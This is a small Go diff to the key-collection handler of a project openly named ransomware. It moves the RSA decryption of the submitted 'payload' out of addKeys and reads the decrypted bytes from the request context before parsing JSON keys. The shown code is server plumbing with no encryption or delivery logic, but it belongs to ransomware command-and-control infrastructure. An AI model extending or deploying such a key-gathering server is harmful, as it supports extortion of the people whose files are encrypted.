@@ -7,24 +7,14 @@ import (
 
 	"github.com/labstack/echo"
 	"github.com/mauri870/ransomware/repository"
-	"github.com/mauri870/ransomware/rsa"
 )
 
 func addKeys(c echo.Context) error {
-	// Check if payload parameter exists
-	payloadValue := c.FormValue("payload")
-	if payloadValue == "" {
-		return c.JSON(http.StatusUnprocessableEntity, ApiResponseNoPayload)
-	}
-
-	// Decrypt the payload
-	jsonPayload, err := rsa.Decrypt(PRIV_KEY, []byte(payloadValue))
-	if err != nil {
-		return c.JSON(http.StatusUnprocessableEntity, ApiResponseBadRSAEncryption)
-	}
+	// Get the payload from context
+	payload := c.Get("payload").([]byte)
 
 	// Parse the json keys
-	keys, err := parseJsonKeys(jsonPayload)
+	keys, err := parseJsonKeys(payload)
 	if err != nil {
 		// Bad Json
 		return c.JSON(http.StatusBadRequest, ApiResponseBadJson)
